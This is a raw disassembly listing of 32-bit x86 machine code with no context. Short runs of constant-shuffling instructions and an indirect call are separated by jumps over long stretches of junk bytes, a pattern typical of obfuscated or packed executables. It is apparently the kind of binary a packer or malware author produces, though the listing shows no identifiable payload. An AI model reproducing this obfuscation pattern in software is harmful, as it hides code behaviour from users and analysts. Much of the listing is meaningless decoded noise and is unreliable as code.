  40e78b:	sbb    al,0xf7
  40e78d:	mov    ebx,0x71c616fc
  40e792:	call   0xd35c:0xa48050ab
  40e799:	scas   eax,DWORD PTR es:[edi]
  40e79a:	mov    DWORD PTR [ebp-0x28],eax
  40e79d:	mov    eax,ds:0x42f608
  40e7a2:	xor    DWORD PTR ds:0x42f5e8,eax
  40e7a8:	mov    DWORD PTR [ebp-0x1c],0x7fa3
  40e7af:	mov    DWORD PTR [ebp-0x20],0x705c
  40e7b6:	jmp    0x40e892
  40e7bb:	push   ebx
  40e7bc:	cmc    
  40e7bd:	aaa    
  40e7be:	fidiv  WORD PTR [edi+0x2bfdfbde]
  40e7c4:	cmp    bh,ch
  40e7c6:	imul   esi,DWORD PTR [edi+0x1bbf8528],0xbf00009b
  40e7d0:	add    BYTE PTR [eax],al
  40e7d2:	add    BYTE PTR [ebx],cl
  40e7d4:	std    
  40e7d5:	fsubr  QWORD PTR [edx+eiz*1+0x1177c580]
  40e7dc:	or     eax,0xb4b11b2f
  40e7e1:	popa   
  40e7e2:	mov    esi,0xc9c19b24
  40e7e7:	dec    ebx
  40e7e8:	xchg   esi,eax
  40e7e9:	mov    ds,WORD PTR ds:0xbc1beaa9
  40e7ef:	out    0xe9,al
  40e7f1:	jnp    0x40e7c7
  40e7f3:	shr    esi,1
  40e7f5:	jg     0x40e7a8
  40e7f7:	jne    0x40e7fd
  40e7f9:	or     esi,DWORD PTR [ebx-0x1b47f9f8]
  40e7ff:	cmp    eax,0xf287c7ed
  40e804:	mov    edi,0xee55b5bd
  40e809:	rcl    DWORD PTR [ecx+0x6d],0x5
  40e80d:	cs rcl edi,cl
  40e810:	xchg   esp,eax
  40e811:	pop    ecx
  40e812:	daa    
  40e813:	in     al,0x84
  40e815:	jmp    0x9d82:0x2633977a
  40e81c:	fnstenv [eax-0x77]
  40e81f:	adc    dh,BYTE PTR [edi+esi*8+0x76879fcc]
  40e826:	fld    QWORD PTR ds:0x3ee9c972
  40e82c:	sbb    eax,0xb576be6d
  40e831:	jae    0x40e804
  40e833:	aas    
  40e834:	mov    DWORD PTR [ebx-0x6c4dd97e],0x190e852a
  40e83e:	dec    ecx
  40e83f:	mov    ebx,0x39190c40
  40e844:	ret    0x378
  40e847:	jae    0x40e887
  40e849:	scas   al,BYTE PTR es:[edi]
  40e84a:	test   eax,0x64370c2
  40e84f:	out    dx,al
  40e850:	(bad)  
  40e852:	pop    ecx
  40e853:	in     al,dx
  40e854:	mov    dl,BYTE PTR [edx+0x59d556e6]
  40e85a:	loope  0x40e825
  40e85c:	int    0x46
  40e85e:	adc    edx,DWORD PTR [eax+ecx*4+0x3e]
  40e862:	(bad)  
  40e864:	inc    eax
  40e865:	push   edx
  40e866:	inc    esi
  40e867:	cmp    eax,0xec7ea7e6
  40e86c:	fild   WORD PTR [eax]
  40e86f:	test   eax,0x6f1e8737
  40e874:	add    bl,ah
  40e876:	cdq    
  40e877:	daa    
  40e878:	fisubr WORD PTR [eax-0xe]
  40e87b:	mov    ch,0xca
  40e87d:	jne    0x40e861
  40e87f:	(bad)  
  40e880:	not    DWORD PTR ds:0xc0f8d0e7
  40e886:	adc    edx,DWORD PTR [ebx-0x5cccc96e]
  40e88c:	jle    0x40e80f
  40e88e:	push   0xc75996c9
  40e893:	inc    ebp
  40e894:	fsubr  st(4),st
  40e896:	pop    edx
  40e897:	add    BYTE PTR [eax],al
  40e899:	add    ecx,eax
  40e89b:	jmp    0x40e977
  40e8a0:	lods   eax,DWORD PTR ds:[esi]
  40e8a1:	hlt    
  40e8a2:	mov    DWORD PTR [edx-0x27],edx
  40e8a5:	jg     0x40e8a6
  40e8a7:	inc    DWORD PTR ds:0xabdabc01
  40e8ad:	xlat   BYTE PTR ds:[ebx]
  40e8ae:	inc    ebp
  40e8af:	or     eax,0x9bda
  40e8b4:	mov    edi,0xf3000000
  40e8b9:	lds    eax,FWORD PTR [edx]
  40e8bb:	repnz adc al,0xb6
  40e8be:	int3   
  40e8bf:	xor    al,0xbe
  40e8c1:	dec    esi
  40e8c2:	sbb    al,0x94
  40e8c4:	xor    ecx,0xffffffde
  40e8c7:	jne    0x40e87a
  40e8c9:	mov    ah,0x1a
  40e8cb:	ret    0x678
  40e8ce:	add    al,0x2
  40e8d0:	xchg   esp,ebp
  40e8d2:	jns    0x40e870
  40e8d4:	adc    DWORD PTR [ebp+0x1ce0175c],0x9b6268e8
  40e8de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8df:	paddusw mm7,mm4
  40e8e2:	(bad)  
  40e8e4:	mov    ecx,0x5f1d3c55
  40e8e9:	js     0x40e8c0
  40e8eb:	sub    bl,ch
  40e8ed:	pop    ss
  40e8ee:	out    0xf8,eax
  40e8f0:	push   0xfffffff6
  40e8f2:	pop    es
  40e8f3:	in     al,dx
  40e8f4:	sbb    ebx,DWORD PTR [esi]
  40e8f6:	adc    cl,BYTE PTR [esi-0x3a]
  40e8f9:	xor    al,0xfa
  40e8fc:	std    
  40e8fd:	jns    0x40e918
  40e8ff:	mov    bh,0x39
  40e901:	bound  edi,QWORD PTR [ebp-0x2bba6035]
  40e907:	popa   
  40e908:	mov    dh,0x81
  40e90a:	cmp    eax,0xd9c426f3
  40e90f:	and    al,0x5
  40e911:	add    esi,DWORD PTR [ebx]
  40e913:	cdq    
  40e914:	adc    ebx,DWORD PTR [eax-0x25e1b907]
  40e91a:	jmp    0x4331:0x56436f5b
  40e921:	jnp    0x40e8e2
  40e923:	fsub   QWORD PTR [edx+0x1f]
  40e926:	sub    al,0x6
  40e928:	or     DWORD PTR [esi+0x3982fa6a],ecx
  40e92e:	pop    ecx
  40e92f:	call   0xe326:0x9de91911
  40e936:	(bad)  
  40e937:	push   esi
  40e938:	inc    edi
  40e939:	xor    BYTE PTR [ecx],bh
  40e93b:	mov    bl,0x70
  40e93d:	sar    BYTE PTR [ecx-0x56],0xad
  40e941:	adc    ebp,esi
  40e943:	rdpmc  
  40e945:	ins    DWORD PTR es:[edi],dx
  40e946:	ror    BYTE PTR [edi+0x57],cl
  40e949:	mov    bl,BYTE PTR ss:[ebx]
  40e94c:	int3   
  40e94d:	add    eax,0x434829c3
  40e952:	test   BYTE PTR [eax],0xc6
  40e955:	push   esp
  40e956:	pop    edx
  40e957:	shl    dl,0x44
  40e95a:	retf   0x214c
  40e95d:	outs   dx,BYTE PTR ds:[esi]
  40e95e:	xchg   esp,eax
  40e95f:	mov    al,ds:0x9cce055b
  40e964:	ja     0x40e925
  40e966:	xor    eax,ecx
  40e968:	sar    BYTE PTR es:[edi-0x89cf032],1
  40e96f:	push   ds
  40e970:	fsub   DWORD PTR [edi]
  40e972:	mov    ebp,0x79b9982b
  40e977:	mov    DWORD PTR [ebp-0x28],0x8e2
  40e97e:	mov    eax,DWORD PTR [ebp-0x28]
  40e981:	mov    ecx,DWORD PTR [ebp-0x24]
  40e984:	xor    eax,0x1c70
  40e989:	xor    DWORD PTR ds:0x42f5b8,0x7ca7
  40e993:	imul   eax,ecx
  40e996:	mov    ecx,DWORD PTR [ebp-0x20]
  40e999:	and    DWORD PTR ds:0x42f5e4,0x3fb5
  40e9a3:	xor    eax,0x2bd0
  40e9a8:	add    DWORD PTR ds:0x42f614,0x42f568
  40e9b2:	or     eax,ecx
  40e9b4:	jmp    0x40ea90
  40e9b9:	test   BYTE PTR ds:0xfeff7ef7,bl
  40e9bf:	(bad)  
  40e9c0:	jmp    FWORD PTR [esi-0x51]
  40e9c3:	sbb    DWORD PTR [edi-0x6d58588e],ebx
  40e9c9:	cdq    
  40e9ca:	pushf  
  40e9cb:	add    BYTE PTR [eax],al
  40e9cd:	mov    edi,0x90000000
  40e9d2:	xor    al,0xca
  40e9d4:	scas   eax,DWORD PTR es:[edi]
  40e9d5:	push   cs
  40e9d6:	dec    eax
  40e9d7:	bound  bx,DWORD PTR [edi]
  40e9da:	mov    al,ds:0xdd55cd2a
  40e9df:	sahf   
  40e9e0:	test   ah,dl
  40e9e2:	mov    ebp,0xf421dcad
  40e9e7:	cwde   
  40e9e8:	add    ah,0xb0
  40e9eb:	(bad)  [ecx-0x2511b5c8]
  40e9f1:	adc    al,0x86
  40e9f3:	and    al,0x88
  40e9f5:	lods   eax,DWORD PTR ds:[esi]
  40e9f6:	outs   dx,BYTE PTR ds:[esi]
  40e9f7:	adc    DWORD PTR [ecx],eax
  40e9f9:	arpl   ax,sp
  40e9fb:	inc    edx
  40e9fc:	lahf   
  40e9fd:	(bad)  
  40e9fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9ff:	and    esp,DWORD PTR [ecx-0x3d]
  40ea02:	add    DWORD PTR [ebp+0x44],esi
  40ea05:	lods   al,BYTE PTR ds:[esi]
  40ea06:	retf   
  40ea07:	pushf  
  40ea08:	push   cs
  40ea09:	xchg   ebp,eax
  40ea0a:	je     0x40e9e2
  40ea0c:	loop   0x40ea64
  40ea0e:	mov    ch,0x8e
  40ea10:	jp     0x40ea60
  40ea12:	lea    esi,[ebp-0x24ae5661]
  40ea18:	rcr    BYTE PTR [edi],1
  40ea1a:	retf   
  40ea1b:	retf   0x40e9
  40ea1e:	stos   DWORD PTR es:[edi],eax
  40ea1f:	jns    0x40ea09
  40ea21:	adc    ch,BYTE PTR [ecx+0x33469443]
  40ea27:	(bad)  [edi+0x9]
  40ea2a:	mov    ah,0xab
  40ea2c:	cli    
  40ea2d:	sahf   
  40ea2e:	xchg   edx,eax
  40ea2f:	mov    BYTE PTR [eax],al
  40ea31:	leave  
  40ea32:	jno    0x40eaa7
  40ea34:	push   es
  40ea35:	push   cs
  40ea36:	out    dx,al
  40ea37:	test   DWORD PTR [eax+0x23],ebp
  40ea3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea3b:	repz adc DWORD PTR cs:[esp+ebx*2+0x36],ebp
  40ea41:	sub    edi,DWORD PTR [ebp+0x6d]
  40ea44:	ja     0x40ea08
  40ea46:	into   
  40ea47:	popa   
  40ea48:	outs   dx,BYTE PTR ds:[esi]
  40ea49:	inc    eax
  40ea4a:	xor    dl,BYTE PTR [eax+0x79]
  40ea4d:	scas   eax,DWORD PTR es:[edi]
  40ea4e:	cmp    ebx,edx
  40ea50:	cs push cs
  40ea52:	aam    0xdd
  40ea54:	leave  
  40ea55:	xor    BYTE PTR [edi+0x15],0x86
  40ea59:	add    eax,0xacb1db8c
  40ea5e:	push   ebp
  40ea5f:	stos   BYTE PTR es:[edi],al
  40ea60:	xchg   edx,eax
  40ea61:	scas   al,BYTE PTR es:[edi]
  40ea62:	pop    ds
  40ea63:	xor    al,0xb
  40ea65:	pop    eax
  40ea66:	(bad)
  40ea69:	mov    edi,0xc6c1204
  40ea6e:	rcl    BYTE PTR [ebp-0x3a],0x58
  40ea72:	xchg   esi,eax
  40ea73:	sahf   
  40ea74:	cmp    DWORD PTR [eax+0x19],esp
  40ea77:	clc    
  40ea78:	sbb    bh,BYTE PTR [bp+si]
  40ea7b:	and    eax,0xcb00c42d
  40ea80:	push   0xffffffb8
  40ea82:	dec    esp
  40ea83:	ds lahf 
  40ea85:	adc    al,0xcf
  40ea87:	adc    esp,DWORD PTR [eax+ebp*4+0x60]
  40ea8b:	call   0x73910847
  40ea90:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ea93:	add    DWORD PTR ds:0x42f54c,0x42f604
  40ea9d:	or     eax,ecx
  40ea9f:	cmp    DWORD PTR ds:0x42f628,0x0
  40eaa6:	jb     0x40eae5
  40eaac:	mov    ecx,DWORD PTR ds:0x42f5cc
  40eab2:	sbb    DWORD PTR ds:0x42f64c,ecx
  40eab8:	jmp    0x40eae5
  40eabd:	push   DWORD PTR [ebp-0xc]
  40eac0:	push   DWORD PTR [ebp-0xc]
  40eac3:	push   0x42a5a3
  40eac8:	push   0x6895
  40eacd:	push   0x392e
  40ead2:	push   0x1de8
  40ead7:	push   DWORD PTR [ebp-0x20]
  40eada:	push   0x7cfd
  40eadf:	call   DWORD PTR ds:0x438810
  40eae5:	mov    ecx,0x74dffff
  40eaea:	sub    ecx,eax
  40eaec:	mov    DWORD PTR [ebp-0x20],ecx
  40eaef:	mov    DWORD PTR [ebp-0x28],0xcb5
  40eaf6:	mov    eax,DWORD PTR [ebp-0x28]
  40eaf9:	movzx  ecx,BYTE PTR ds:0x42f650
  40eb00:	and    DWORD PTR ds:0x42f5d4,ecx
  40eb06:	jmp    0x40ebe2
  40eb0b:	in     eax,dx
  40eb0c:	cmp    al,0xe2
  40eb0e:	xchg   edx,eax
  40eb0f:	repz fdivp st(5),st
  40eb12:	jg     0x40eb01
  40eb14:	or     eax,edx
  40eb16:	dec    esi
  40eb17:	into   
  40eb18:	mov    esp,0x9d58de5a
  40eb1d:	add    BYTE PTR [eax],al
  40eb1f:	mov    edi,0xbd000000
  40eb24:	data16 hlt 
  40eb26:	adc    DWORD PTR [esi],ebp
  40eb28:	jb     0x40eb9f
  40eb2a:	pusha  
  40eb2b:	lds    eax,FWORD PTR [ebx+esi*2]
  40eb2e:	pop    ebx
  40eb2f:	imul   ebx,ebp,0x13
  40eb32:	add    BYTE PTR [eax],dl
  40eb34:	mov    BYTE PTR [edi],dh
  40eb36:	dec    eax
  40eb37:	hlt    
  40eb38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb39:	pop    esp
  40eb3a:	lds    ebp,FWORD PTR [ebp-0x63b5b5f7]
  40eb40:	test   eax,0x2c62e7e7
  40eb45:	push   edx
  40eb46:	(bad)  
  40eb47:	xchg   ebp,eax
  40eb48:	(bad)  
  40eb49:	mov    cl,0xec
  40eb4b:	sbb    DWORD PTR [ebx],0xffffff96
  40eb4e:	fadd   st,st(1)
  40eb50:	xor    eax,0x2cdc1ece
  40eb55:	mov    bh,0x7e
  40eb57:	cmp    eax,0x988527bc
  40eb5c:	cdq    
  40eb5d:	fild   QWORD PTR [ebx]
  40eb5f:	inc    ebx
  40eb60:	rcr    BYTE PTR [esi-0x40],cl
  40eb63:	fs loop 0x40eb1e
  40eb66:	mov    bl,ah
  40eb68:	jle    0x40eb29
  40eb6a:	xor    eax,0x7ba935b3
  40eb6f:	mov    ds:0xa45097e3,eax
  40eb74:	xor    eax,0xbb93ec15
  40eb79:	pop    ebx
  40eb7a:	pusha  
  40eb7b:	jb     0x40eb6f
  40eb7d:	xchg   ebx,eax
  40eb7e:	pop    ds
  40eb7f:	pop    eax
  40eb80:	loop   0x40ebd7
  40eb82:	mov    ah,0xd5
  40eb84:	adc    bh,BYTE PTR [esi-0x79]
  40eb87:	dec    ebp
  40eb88:	scas   eax,DWORD PTR es:[edi]
  40eb89:	dec    edi
  40eb8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb8b:	mov    al,0x1e
  40eb8d:	push   edi
  40eb8e:	adc    al,0xb3
  40eb90:	sub    BYTE PTR [ebx-0x2bc823f],dl
  40eb96:	pop    edx
  40eb97:	std    
  40eb98:	arpl   WORD PTR [eax-0x708a9408],di
  40eb9e:	retf   0x6a7d
  40eba1:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40eba3:	ss repz fs ret 
  40eba7:	scas   al,BYTE PTR es:[edi]
  40eba8:	outs   dx,DWORD PTR ds:[esi]
  40eba9:	lea    edi,[ebp+0x42d011a0]
  40ebaf:	inc    ecx
  40ebb0:	cmp    bl,bh
  40ebb2:	jmp    0x7ebdf5a4
  40ebb7:	xchg   esp,eax
  40ebb8:	add    cl,BYTE PTR [ebx+0x768ae3b8]
  40ebbe:	ds sahf 
  40ebc0:	jnp    0x40ebe1
  40ebc2:	pop    ebp
  40ebc3:	sbb    BYTE PTR [edx+0x1c],ah
  40ebc6:	pop    es
  40ebc7:	dec    ebp
  40ebc8:	out    0x17,al
  40ebca:	dec    ecx
  40ebcb:	push   ecx
  40ebcc:	jge    0x40ebca
  40ebce:	jnp    0x40ebb6
  40ebd0:	pop    ebp
  40ebd1:	gs push ecx
  40ebd3:	lods   al,BYTE PTR ds:[esi]
  40ebd4:	jl     0x40eba3
  40ebd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebd7:	adc    BYTE PTR [ebp+0x50],bh
  40ebda:	or     bl,BYTE PTR [esi-0x27898083]
  40ebe0:	ds ss sub eax,0xcf3
  40ebe7:	add    ecx,0x64cc
  40ebed:	jmp    0x40ecc9
  40ebf2:	mov    ch,0x9c
  40ebf4:	cmp    DWORD PTR [edi-0x57],0xc3deff7f
  40ebfb:	cwde   
  40ebfc:	adc    ah,BYTE PTR [ecx-0x214dd09f]
  40ec02:	pop    ss
  40ec03:	sahf   
  40ec04:	add    BYTE PTR [eax],al
  40ec06:	mov    edi,0x51000000
  40ec0b:	mov    esp,0x743c8dd9
  40ec10:	into   
  40ec11:	add    eax,0x57bdef08
  40ec16:	mov    ds,WORD PTR [edx-0x58bc309]
  40ec1c:	xor    bl,BYTE PTR [esi+ebx*8+0x28]
  40ec20:	outs   dx,DWORD PTR ds:[esi]
  40ec21:	jge    0x40ebd7
  40ec23:	jno    0x40ebc4
  40ec25:	push   es
  40ec26:	ds mov edx,0xaffc194
  40ec2c:	out    dx,al
  40ec2d:	push   es
  40ec2e:	jmp    0x40ebc9
  40ec30:	fidiv  WORD PTR [esi-0x3846d8c4]
  40ec36:	dec    edx
  40ec37:	in     al,0x13
  40ec39:	test   BYTE PTR [ebp-0x72],ch
  40ec3c:	cbw    
  40ec3e:	(bad)  
  40ec3f:	clc    
  40ec40:	mov    eax,ds:0xd05b1a91
  40ec45:	xchg   DWORD PTR [ecx],eax
  40ec47:	cmp    DWORD PTR [ebp-0x2d],eax
  40ec4a:	fnstsw WORD PTR [edx]
  40ec4c:	sbb    edi,DWORD PTR [ebx]
  40ec4e:	dec    ecx
  40ec4f:	lea    esi,[esi]
  40ec51:	mov    ebp,0x713250c0
  40ec56:	out    dx,eax
  40ec57:	(bad)  
  40ec58:	repnz pop ds
  40ec5a:	nop
  40ec5b:	or     eax,0xfca95597
  40ec60:	stos   BYTE PTR es:[edi],al
  40ec61:	inc    eax
  40ec62:	mov    al,ds:0x90440964
  40ec67:	loop   0x40ec92
  40ec69:	adc    al,0x11
  40ec6b:	aas    
  40ec6c:	xor    bh,cl
  40ec6e:	xchg   esp,eax
  40ec6f:	(bad)  
  40ec70:	cmc    
  40ec71:	mov    fs:0x6ac3e732,al
  40ec77:	(bad)  
  40ec78:	loope  0x40ec7b
  40ec7a:	jp     0x40ec82
  40ec7c:	push   cs
  40ec7d:	lods   eax,DWORD PTR ds:[esi]
  40ec7e:	push   eax
  40ec7f:	jmp    0x40ecff
  40ec81:	sti    
  40ec82:	repz dec esp
  40ec84:	cmp    al,al
  40ec86:	cli    
  40ec87:	scas   eax,DWORD PTR es:[edi]
  40ec88:	or     al,0x2b
  40ec8a:	mov    cl,0xc7
  40ec8c:	lods   eax,DWORD PTR ds:[esi]
  40ec8d:	mov    al,0xd4
  40ec8f:	fnstsw WORD PTR [edx+0x1bfc2bfa]
  40ec95:	fidiv  WORD PTR [ebx]
  40ec97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec98:	xchg   ebx,eax
  40ec99:	xchg   ebx,eax
  40ec9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec9b:	xlat   BYTE PTR ds:[ebx]
  40ec9c:	and    edi,ecx
  40ec9e:	fst    DWORD PTR [ecx+0x228a65c3]
  40eca4:	xchg   edi,eax
  40eca5:	mov    bh,0xe4
  40eca7:	mov    ds:0x27692b9d,eax
  40ecac:	xchg   ecx,eax
  40ecad:	pop    ebx
  40ecae:	out    dx,al
  40ecaf:	fnstcw WORD PTR [edi+0x16637557]
  40ecb5:	mov    ecx,0xe902224a
  40ecba:	lds    ecx,FWORD PTR [ebp+0x41]
  40ecbd:	push   0x8522bd9a
  40ecc2:	cmp    esp,DWORD PTR [eax+edi*4+0x277cf773]
  40ecc9:	or     eax,0x2afe
  40ecce:	sbb    ecx,0xe8e
  40ecd4:	push   0xfffffffe
  40ecd6:	pop    ecx
  40ecd7:	sub    ecx,eax
  40ecd9:	mov    DWORD PTR [ebp-0x10],ecx
  40ecdc:	sub    ecx,eax
  40ecde:	mov    DWORD PTR [ebp-0x24],0x4f03
  40ece5:	mov    DWORD PTR [ebp-0x28],0x9b8
  40ecec:	adc    DWORD PTR ds:0x42f64c,edx
  40ecf2:	mov    eax,DWORD PTR [ebp-0x28]
  40ecf5:	and    DWORD PTR ds:0x42f574,0x35cd
  40ecff:	mov    ecx,DWORD PTR [ebp-0x24]
  40ed02:	jmp    0x40edde
  40ed07:	mov    ebp,esi
  40ed09:	and    ecx,esp
  40ed0b:	jge    0x40ed02
  40ed0d:	leave  
  40ed0e:	std    
  40ed0f:	fnstenv [edi-0x2e]
  40ed12:	fisubr DWORD PTR [edi]
  40ed14:	lods   eax,DWORD PTR ds:[esi]
  40ed15:	shl    DWORD PTR [eax-0x2a],1
  40ed18:	sahf   
  40ed19:	add    BYTE PTR [eax],al
  40ed1b:	mov    edi,0xd8000000
  40ed20:	bound  ebp,QWORD PTR [esi-0xd]
  40ed23:	int3   
  40ed24:	test   DWORD PTR [ebx],esi
  40ed26:	sbb    al,0x86
  40ed28:	int    0xc1
  40ed2a:	inc    esp
  40ed2b:	clc    
  40ed2c:	sbb    bl,bl
  40ed2e:	daa    
  40ed2f:	mov    eax,0x8c0bfaaa
  40ed34:	sub    al,0xdd
  40ed36:	and    eax,0xda9be812
  40ed3b:	js     0x40ed42
  40ed3d:	(bad)  
  40ed41:	nop
  40ed42:	adc    eax,0xdc044e8f
  40ed47:	xchg   BYTE PTR [eax+0x4a],bl
  40ed4a:	inc    edx
  40ed4b:	addr16 mov ah,bh
  40ed4e:	aad    0x3c
  40ed50:	icebp  
  40ed51:	adc    BYTE PTR [eax-0x3],cl
  40ed54:	jb     0x40edd4
  40ed56:	idiv   DWORD PTR ds:0xcfa3c6e
  40ed5c:	adc    bl,BYTE PTR [ecx]
  40ed5e:	stc    
  40ed5f:	xor    ebx,0xa9f5eaa4
  40ed65:	pop    ecx
  40ed66:	sub    esp,edx
  40ed68:	ins    DWORD PTR es:[edi],dx
  40ed69:	fdivrp st(0),st
  40ed6b:	or     dh,cl
  40ed6d:	xchg   BYTE PTR [ecx],bh
  40ed6f:	add    BYTE PTR [ecx+0x80c86bb],cl
  40ed75:	cmc    
  40ed76:	rcl    DWORD PTR [edx+0x608d606b],cl
  40ed7c:	sbb    eax,0x5a11b162
  40ed81:	xchg   ecx,eax
  40ed82:	add    al,0xa0
  40ed84:	sti    
  40ed85:	(bad)  
  40ed87:	(bad)  
  40ed88:	hlt    
  40ed89:	aam    0x50
  40ed8b:	fadd   QWORD PTR [edi+0xd]
  40ed8e:	add    eax,0x48b475dd
  40ed93:	pop    ds
  40ed94:	scas   al,BYTE PTR es:[edi]
  40ed95:	das    
  40ed96:	clc    
  40ed97:	push   edx
  40ed98:	enter  0x5237,0x6b
  40ed9c:	(bad)  
  40ed9d:	mov    dl,0xf0
  40ed9f:	in     al,dx
  40eda0:	int3   
  40eda1:	pop    ebx
  40eda2:	int    0x97
  40eda4:	xchg   ebx,eax
  40eda5:	add    DWORD PTR [ebx+0x12],esp
  40eda8:	push   esi
  40eda9:	jp     0x40ed57
  40edab:	push   0xffffffbd
  40edad:	(bad)  
  40edae:	cmp    bl,ch
  40edb0:	push   ss
  40edb1:	jnp    0x40ee1f
  40edb3:	mov    ch,0xe3
  40edb5:	icebp  
  40edb6:	jl     0x40ed6d
  40edb8:	dec    eax
  40edb9:	sbb    al,0xd8
  40edbb:	cmp    DWORD PTR [ebp+0x12],0xffffffbd
  40edbf:	and    al,0xaf
  40edc1:	jp     0x40ed62
  40edc3:	xor    ecx,DWORD PTR [ebx+0x6e]
  40edc6:	push   edx
  40edc7:	stos   BYTE PTR es:[edi],al
  40edc8:	mov    ds:0x7ce14032,al
  40edcd:	dec    ebx
  40edce:	mov    ebp,0x23482ea7
  40edd3:	pushf  
  40edd4:	add    ah,BYTE PTR [ebx+ebx*4+0x49d48462]
  40eddb:	repnz add al,0x22
  40edde:	add    eax,0x6cc4
  40ede3:	or     eax,ecx
  40ede5:	adc    DWORD PTR ds:0x42f534,0x2810
  40edef:	sub    eax,0x7f7f
  40edf4:	and    ecx,DWORD PTR ds:0x42f610
  40edfa:	mov    DWORD PTR [ebp-0x20],eax
  40edfd:	mov    DWORD PTR [ebp-0x1c],0x2fa9
  40ee04:	sub    eax,0x7bb8
  40ee09:	jmp    0x40eee5
  40ee0e:	cmp    bh,0x5e
  40ee11:	outs   dx,DWORD PTR ds:[esi]
  40ee12:	jg     0x40ee03
  40ee14:	mov    cl,0xff
  40ee16:	fadd   DWORD PTR [ecx]
  40ee18:	or     eax,0xdbbee6c3
  40ee1d:	lahf   
  40ee1e:	xchg   ebp,eax
  40ee1f:	lahf   
  40ee20:	add    BYTE PTR [eax],al
  40ee22:	mov    edi,0x57000000
  40ee27:	push   0x76e3f9e9
  40ee2c:	xor    DWORD PTR ds:0x2f133779,eax
  40ee32:	cli    
  40ee33:	push   edx
  40ee34:	es add al,0xb6
  40ee37:	rcr    BYTE PTR [ebp+0x77],1
  40ee3a:	lds    esp,FWORD PTR [ebp+0x1c]
  40ee3d:	ja     0x40edc2
  40ee3f:	mov    dh,BYTE PTR [ebp-0x7b]
  40ee42:	dec    esi
  40ee43:	jmp    0xb9464ef0
  40ee48:	xor    DWORD PTR [eax-0x5c],edi
  40ee4b:	out    0xcb,eax
  40ee4d:	fld    QWORD PTR [eax+eax*8+0x6c]
  40ee51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee52:	(bad)  
  40ee53:	jp     0x40ee77
  40ee55:	clc    
  40ee56:	xor    DWORD PTR [ebx-0x3c],edi
  40ee59:	je     0x40ee6c
  40ee5b:	pushf  
  40ee5c:	jecxz  0x40eeaa
  40ee5e:	stos   BYTE PTR es:[edi],al
  40ee5f:	sbb    ch,BYTE PTR [edx+0x721954]
  40ee65:	mov    dl,0xcc
  40ee67:	sar    BYTE PTR [ebx-0x3e],1
  40ee6a:	(bad)  
  40ee6b:	shr    BYTE PTR [edx+0x43],1
  40ee6e:	xchg   ebp,eax
  40ee6f:	stos   BYTE PTR es:[edi],al
  40ee70:	adc    eax,0x3c6bd456
  40ee75:	out    dx,eax
  40ee76:	leave  
  40ee77:	mov    dl,0xce
  40ee79:	test   DWORD PTR [esp+edi*4+0x31],edx
  40ee7d:	(bad)  
  40ee7e:	mov    bl,0x36
  40ee80:	mov    WORD PTR [ebx+ecx*8],es
  40ee83:	xchg   esp,eax
  40ee84:	sbb    al,0x68
  40ee86:	jmp    DWORD PTR [ebx+0x70]
  40ee89:	out    dx,eax
  40ee8a:	and    BYTE PTR [ebx+esi*2],bl
  40ee8d:	mov    ebp,0x49528e36
  40ee92:	fs push esp
  40ee94:	fild   WORD PTR [ebx+0x7c74a1e4]
  40ee9a:	in     eax,dx
  40ee9b:	or     esp,ecx
  40ee9d:	mov    eax,0x8ae9697
  40eea2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eea3:	rol    BYTE PTR [ebp-0x4e98aaa4],1
  40eea9:	pop    edi
  40eeaa:	jmp    0x40ee91
  40eeac:	jbe    0x40ee82
  40eeae:	inc    esi
  40eeaf:	test   DWORD PTR [ebx+0x32234b7c],esi
  40eeb5:	fsubr  DWORD PTR [edx]
  40eeb7:	pop    ebx
  40eeb8:	retf   0xa825
  40eebb:	or     eax,0xfe4c780c
  40eec0:	arpl   WORD PTR [ebp+0x72e8a2b9],bp
  40eec6:	mov    eax,0x1b224b3
  40eecb:	adc    al,0x33
  40eecd:	add    ebx,DWORD PTR [edi+0x4]
  40eed0:	pushf  
  40eed1:	cmp    edi,ebp
  40eed3:	es fucomp st(0)
  40eed6:	and    al,0x71
  40eed8:	call   0xf961f15a
  40eedd:	jne    0x40ee6b
  40eedf:	int3   
  40eee0:	xor    BYTE PTR [edx+edi*8-0x3e],0xdf
  40eee5:	mov    DWORD PTR [ebp-0x20],0x2f
  40eeec:	sub    DWORD PTR ds:0x42f564,ebx
  40eef2:	mov    DWORD PTR [ebp-0x24],0x4cab
  40eef9:	adc    eax,ecx
  40eefb:	jmp    0x40efd7
  40ef00:	sbb    DWORD PTR [ecx-0xe],ebx
  40ef03:	test   eax,0xf95babf2
  40ef08:	nop
  40ef09:	mov    eax,0x6a1c3390
  40ef0e:	mov    ebx,0xa05438
  40ef13:	add    BYTE PTR [edi-0x55000000],bh
  40ef19:	ja     0x40ef9a
  40ef1b:	fcomi  st,st(0)
  40ef1d:	out    dx,al
  40ef1e:	call   0x3df4cf66
  40ef23:	and    ebx,esp
  40ef25:	mov    eax,ds:0x92e1df76
  40ef2a:	les    ebx,FWORD PTR [edi]
  40ef2c:	shr    BYTE PTR [ebp+0x40],0x6b
  40ef30:	ins    BYTE PTR es:[edi],dx
  40ef31:	mov    ecx,0xaeb9cea6
  40ef36:	sahf   
  40ef37:	int3   
  40ef38:	es mov al,0x26
  40ef3b:	or     bh,dl
  40ef3d:	gs cld 
  40ef3f:	into   
  40ef40:	shl    BYTE PTR [esi],1
  40ef42:	sub    BYTE PTR [edi+ecx*2-0x74f0be34],cl
  40ef49:	mov    dh,0xc3
  40ef4b:	or     eax,0xb85b8b3d
  40ef50:	dec    esp
  40ef51:	retf   0x1c83
  40ef54:	jne    0x40ef80
  40ef56:	mov    ch,al
  40ef58:	das    
  40ef59:	add    eax,0xa005d53e
  40ef5e:	mov    dl,0xdc
  40ef60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef61:	jns    0x40eefc
  40ef63:	imul   esi,DWORD PTR [ebx-0x7063d31],0x6c7d7e8d
